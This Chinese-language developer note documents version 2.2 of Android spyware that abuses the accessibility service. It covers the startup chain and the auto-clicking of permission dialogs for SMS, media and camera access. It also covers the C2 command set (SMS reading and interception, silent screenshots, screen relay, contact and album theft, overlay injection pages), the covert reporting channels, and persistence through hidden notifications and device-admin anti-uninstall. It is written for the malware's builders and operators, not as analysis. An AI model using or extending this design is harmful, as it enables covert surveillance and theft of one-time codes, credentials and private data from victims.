# 2.2 架构梳理（调试模式）

> 手机在充电/没电时不方便实测，这份文档把 2.2 的启动链路、指令能力、上报与保活
> 一次讲清，改代码时对照它走。

## 一、唯一启动入口

```
系统回调 AccessibilityService.onServiceConnected()
  └─ ڝږ؁ڋ/ڽ.start(service)
       ├─ 日志：debug flow: permission in 2s, cleanup in 45s
       ├─ +2s  → ڝږ؁ڋ/ٿ (PermStarter)  → PermissionActivity
       ├─       → ڝږ؁ڋ/ڤ (PermAutoGrant)：每个权限框停 2 秒再点“允许”
       └─ +45s → ڝږ؁ڋ/ڿ (RecentsCleaner)：最近任务 → 全部清除 → 回桌面
```

`isDebug(Context)` = `inject_state.debug_mode`（默认 true）。
为 true 时，`onServiceConnected` 在读完 Socket 之后直接 `goto :goto_9`，
跳过原版全部引导；为 false 时走原版整套流程，不做任何干预。

## 二、调试模式下「只做三件事」

| 时间 | 动作 | 代码 |
|---|---|---|
| 0s | 连服务器、上报在线 | `SocketManager` / `deviceOnline`（**未改动**） |
| 2s | 申请权限，**每个框停 2 秒**再点 | `ڽ` → `ٿ` → `ڤ` |
| 45s | 清最近任务、回桌面 | `ڿ` |

权限清单（API 33+）：

```
READ_SMS  RECEIVE_SMS  READ_MEDIA_IMAGES  READ_MEDIA_VIDEO  CAMERA
（不含 POST_NOTIFICATIONS）
```

点击顺序（每个 2 秒一轮，最多 3 轮）：

```
permission_allow_all_button → permission_allow_button → permission_allow_foreground_only_button
（com.android.permissioncontroller / com.google.android.permissioncontroller 两套前缀）
```

## 三、被关闭的原版引导（debug 下全部短路）

| 流水线 | 位置 | 原先会做什么 |
|---|---|---|
| A 服务连上引导 | `onServiceConnected` | 遮罩、电池检查、“优化中” |
| B P1 | `ڛڜڕڰڑ/ء.؋()` | 电池白名单 + 自启动页 |
| C 厂商页分派 | `ڝږ؁ڋ/ؤ.run()` | 三星 BatteryActivity、小米省电、华为启动管理… |
| D 录屏请求 | `ScreenCaptureActivity` | 循环拉 MediaProjection 授权页 |
| E 电池开关 | `ڗًقڔ/؋.ه()` | `battery_grant` 默认 false |
| F 设备管理器 | `ڛڜڕڰڑ/ء` pswitch_2 | `ADD_DEVICE_ADMIN` 弹窗（防卸载） |

## 四、可以「继承指令」的能力（本地不自动跑）

这些全部由 C2 下发指令触发，2.2 源码里能力都在，调试模式不需要本地预跑：

| 能力 | 指令 | 说明 |
|---|---|---|
| 短信读取 | `readSmsList` | 拿到短信列表后走二进制 WS 上报 |
| 短信监听 | `SMS_RECEIVED` → `MainReceiver` | 清单已加 `RECEIVE_SMS`，收到即上报 |
| 截图（普通） | `takeScreen` / `screenshot` | 无障碍 `takeScreenshot` |
| 截图（静默） | `silentShot` | 无提示抓屏 |
| 投屏中继 | `screen_relay` / `stopScreenRelay` | MediaProjection |
| 录屏授权 | `reqScreenPermission` / `releaseScreenCapture` | 打开/释放 `ScreenCaptureActivity` |
| 相册 | `readAlbumList` / `readAlbumLast` / `readAlbumThumbnail` | 需要 `READ_MEDIA_*` |
| 通讯录 | `readContactList` | |
| 注入页 | `updatePageRule` / `transparent` / `catAllViewSwitch` | 页面规则、透明覆盖 |
| 锁屏 | `lockScreen` / `swipePwdScreenOn` / `swipePwdScreenOff` | |

**结论**：调试模式下本地**只需要权限 + 在线**，其余等运营在面板上下指令。

## 五、上报通道（未改动）

| 通道 | 触发 | 载体 |
|---|---|---|
| 设备在线 | 连上即发 | Socket.IO `deviceOnline` |
| 无障碍树 | `uploadTree`（事件驱动 + 指令） | Binary WS / Socket.IO 自动切换 |
| 截图帧 | `takeScreen` 等指令 | Binary WS 分片 |
| 崩溃/诊断 | `DiagReporter` | 二进制 WS `acc_lifecycle` |

## 六、保活（正式模式用，debug 关闭）

```
ForegroundKeepAliveService   前台服务 + 通知渠道 importance=0（不显示通知）
DeviceAdminKeepAlive         设备管理器身份，被杀后系统更容易拉回
AlarmReviveReceiver          定时 Alarm 复活
KeepAliveWorker/JobService   WorkManager 周期任务
battery_grant                厂商电池白名单（三星为手动 UI，默认关）
```

debug_mode 下只保留前台服务与 Alarm，设备管理器与电池跳转都跳过，
避免测试时反复弹窗。

## 七、开关一览

| 开关 | 位置 | 默认 | 作用 |
|---|---|---|---|
| `debug_mode` | `inject_state` | true | 只跑权限 + 清场，跳过全部引导 |
| `battery_grant` | `inject_state` | false | 是否尝试跳电池白名单页 |
| `auto_lock_on_acc` | `inject_state` | — | 旧版开关（黑屏页），2.2 已不读 |

正式出包时把 `debug_mode` 置为 false 即可恢复原版全套引导，代码无需再改。
